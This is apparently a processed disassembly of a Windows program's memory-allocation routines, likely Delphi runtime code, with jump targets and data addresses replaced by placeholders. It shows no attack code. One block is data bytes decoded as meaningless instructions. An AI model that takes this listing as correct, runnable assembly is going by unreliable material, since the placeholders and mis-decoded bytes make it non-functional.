sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031b8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
les edx [ ecx - 0x3f74ffba ]
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
inc eax
add [ eax + 0x60004055 ] al
xor eax [ eax ]
push esp
xor eax [ eax ]
nop
push ebp
inc eax
add [ eax - 0xbffbfd0 ] bh
xor [ eax ] al
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
sar bh 0x25
jb r-xdata
mov [ ecx - 0x3f74ffba ] ss
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ab2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401b96
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402264
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_40393c
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_40393c
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40240a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_40393c
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
